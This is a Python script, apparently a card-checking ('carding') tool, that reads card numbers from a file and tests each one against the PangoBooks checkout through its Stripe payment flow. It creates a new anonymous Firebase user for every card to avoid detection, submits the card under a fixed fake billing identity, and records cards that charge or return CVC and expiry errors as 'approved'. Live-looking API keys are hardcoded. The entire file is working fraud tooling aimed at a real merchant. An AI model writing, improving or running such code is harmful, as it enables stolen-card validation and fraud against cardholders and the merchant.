import requests
import json
import urllib.parse
import time
import os
import random

FIREBASE_API_KEY = "AIzaSyCX5msqd223t0ZQgM3URQzLenKrmoQipIA"
STRIPE_KEY = "pk_live_51KN2QBB88RUu9OnVkyDTgsNCOgqFUVLLB5irQwiB10vXMFUaTOLAjQC6Tu6ESXyBHuVLKy0QJaLzsNrUiIjKII1j00yJp8Pta3"

BILLING_NAME = "james"
BILLING_EMAIL = "ogggvime@telegmail.com"
BILLING_ADDRESS_LINE1 = "6728 County Road 3 1/4"
BILLING_CITY = "Erie"
BILLING_STATE = "CO"
BILLING_POSTAL_CODE = "80516"
BILLING_COUNTRY = "US"
SHIPPING_NAME = "james"
SHIPPING_ADDRESS_LINE1 = "6728 County Road 3 1/4"
SHIPPING_CITY = "Erie"
SHIPPING_STATE = "CO"
SHIPPING_POSTAL_CODE = "80516"
SHIPPING_COUNTRY = "US"

INPUT_FILE = "cc.txt"
OUTPUT_FILE = "approved.txt"

def format_amount(amount_cents, currency_code='usd'):
    if amount_cents is None:
        return None
    symbol = '$' if currency_code.lower() == 'usd' else currency_code.upper()
    return f"{symbol}{amount_cents / 100:.2f}"

def get_firebase_token_and_uid(api_key, proxy=None):
    """
    Creates a new anonymous Firebase user and returns their token and uid.
    This will give a different uid every time it's called.
    """
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
    payload = {"returnSecureToken": True}
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}
    
    try:
        response = requests.post(url, json=payload, proxies=proxies)
        response.raise_for_status()
        data = response.json()
        return data.get("idToken"), data.get("localId") # localId is the uid
    except requests.exceptions.RequestException as e:
        print(f"Error getting Firebase token: {e}")
        return None, None

# --- CHANGE 1: Modified function to accept uid ---
def get_checkout_info(bearer_token, uid, proxy=None):
    url = 'https://us-central1-pangobooks.cloudfunctions.net/checkout-getCheckoutV2'
    headers = {
        'accept': '*/*', 'accept-language': 'en-GB,en;q=0.9', 'authorization': f'Bearer {bearer_token}',
        'content-type': 'application/json', 'origin': 'https://pangobooks.com',
        'referer': 'https://pangobooks.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    payload = {
        "data": {"web": True, "type": "full", "bucksBreakdown": {"bucksBack": False, "earned": False, "promo": False},
                 "buyerAddress": None, 
                 "bookIds": ["4856a0ba-5566-4b20-93c4-ce4569d0d1c6-Oy4uvXvZSac1JmiHaMetUi1zecb2"],
                 # --- The uid is now passed into the function ---
                 "uid": uid,
                 "request_id": random.randint(100000, 999999)}
    }
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}
    
    try:
        response = requests.post(url, headers=headers, json=payload, proxies=proxies)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error getting checkout info: {e}")
        return None

def confirm_stripe_payment(payment_intent_id, client_secret, card_number, card_exp_month, card_exp_year, card_cvc, proxy=None):
    url = f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm'
    headers = {
        'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    payload = {
        'return_url': 'https://pangobooks.com/order/payment/t',
        'shipping[name]': SHIPPING_NAME, 'shipping[address][line1]': SHIPPING_ADDRESS_LINE1,
        'shipping[address][city]': SHIPPING_CITY, 'shipping[address][country]': SHIPPING_COUNTRY,
        'shipping[address][postal_code]': SHIPPING_POSTAL_CODE, 'shipping[address][state]': SHIPPING_STATE,
        'payment_method_data[type]': 'card', 'payment_method_data[card][number]': card_number,
        'payment_method_data[card][cvc]': card_cvc, 'payment_method_data[card][exp_year]': card_exp_year,
        'payment_method_data[card][exp_month]': card_exp_month, 'payment_method_data[allow_redisplay]': 'unspecified',
        'payment_method_data[billing_details][name]': BILLING_NAME, 'payment_method_data[billing_details][email]': BILLING_EMAIL,
        'payment_method_data[billing_details][address][line1]': BILLING_ADDRESS_LINE1,
        'payment_method_data[billing_details][address][city]': BILLING_CITY,
        'payment_method_data[billing_details][address][country]': BILLING_COUNTRY,
        'payment_method_data[billing_details][address][postal_code]': BILLING_POSTAL_CODE,
        'payment_method_data[billing_details][address][state]': BILLING_STATE,
        'payment_method_data[payment_user_agent]': 'stripe.js/234f261dc5; stripe-js-v3/234f261dc5; payment-element',
        'payment_method_data[referrer]': 'https://pangobooks.com', 'payment_method_data[time_on_page]': '3305535',
        'expected_payment_method_type': 'card', 'use_stripe_sdk': 'true', 'key': STRIPE_KEY, 'client_secret': client_secret
    }
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}
    
    try:
        encoded_payload = urllib.parse.urlencode(payload)
        response = requests.post(url, headers=headers, data=encoded_payload, proxies=proxies)
        response_data = response.json()
        
        # Check HTTP status code - 200 means success
        if response.status_code == 200:
            status = response_data.get('status', '')
            
            # If requires_action, still mark as declined (needs 3DS)
            if status == 'requires_action':
                reason = "Payment requires 3D Secure authentication"
                return False, response_data, reason
            
            # HTTP 200 = Charged/Success
            if status == 'succeeded':
                return True, response_data, "Payment Successful"
            else:
                # Even if status is not 'succeeded', HTTP 200 means it's valid
                return True, response_data, f"Charged (Status: {status})"
        
        response.raise_for_status()
        return False, response_data, "Payment failed"

    except requests.exceptions.HTTPError:
        error_info = response_data.get('error', {})
        decline_code = error_info.get('decline_code')
        
        saveable_decline_codes = {
            'incorrect_cvc', 'invalid_expiry_month', 'invalid_expiry_year',
            'processing_error'
        }

        if decline_code in saveable_decline_codes:
            reason = f"Saved due to error: {decline_code.replace('_', ' ').title()}"
            return True, response_data, reason
        else:
            return False, response_data, "Card Declined"

    except requests.exceptions.RequestException as err:
        return False, {"error": {"message": str(err)}}, "Network Error"

if __name__ == "__main__":
    if not os.path.exists(INPUT_FILE):
        print(f"Error: Input file '{INPUT_FILE}' not found.")
        exit()

    # --- CHANGE 2: The main loop now gets a new token/uid for each card ---
    with open(INPUT_FILE, 'r') as f_in, open(OUTPUT_FILE, 'a') as f_out:
        for line in f_in:
            line = line.strip()
            if not line:
                continue

            # Get a NEW token and uid for this specific card
            fresh_token, new_uid = get_firebase_token_and_uid(FIREBASE_API_KEY)
            
            if not fresh_token or not new_uid:
                print("Failed to get new token/uid, skipping card.")
                continue
            
            print(f"\n--- Processing new card with UID: {new_uid} ---")

            checkout_data = get_checkout_info(fresh_token, new_uid)
            if not checkout_data or 'result' not in checkout_data:
                print("Failed to get intent, skipping card.")
                continue
            
            result = checkout_data['result']
            payment_intent_id = result.get('paymentIntent')
            client_secret = result.get('clientSecret')

            if not payment_intent_id or not client_secret:
                print("Failed to extract intent details, skipping card.")
                continue

            try:
                card_number, exp_month, exp_year, cvc = line.split('|')
                print(f"Card: {card_number} | Intent: {payment_intent_id}")
                
                should_save, response_data, reason = confirm_stripe_payment(
                    payment_intent_id, client_secret, card_number, exp_month, exp_year, cvc
                )

                if should_save:
                    approved_data = {
                        "cc_line": line,
                        "reason": reason,
                        "response": response_data
                    }
                    f_out.write(json.dumps(approved_data, indent=4) + '\n')
                    f_out.write("--- NEXT CARD ---\n")
                    f_out.flush()
                    print(json.dumps(approved_data, indent=4))
                else:
                    error_info = response_data.get('error', {})
                    if error_info:
                        amount = error_info.get("payment_intent", {}).get("amount", 0)
                        currency = error_info.get("payment_intent", {}).get("currency", 'usd')
                    else:
                        amount = response_data.get("amount", 0)
                        currency = response_data.get("currency", 'usd')

                    simplified_response = {
                        "message": reason,
                        "decline_code": error_info.get("decline_code"),
                        "amount": format_amount(amount, currency)
                    }
                    print(json.dumps(simplified_response, indent=4))
                
                time.sleep(2)

            except ValueError:
                print(f"Could not parse card line: {line}")
                pass
            except Exception as e:
                print(f"An unexpected error occurred while processing {line}: {e}")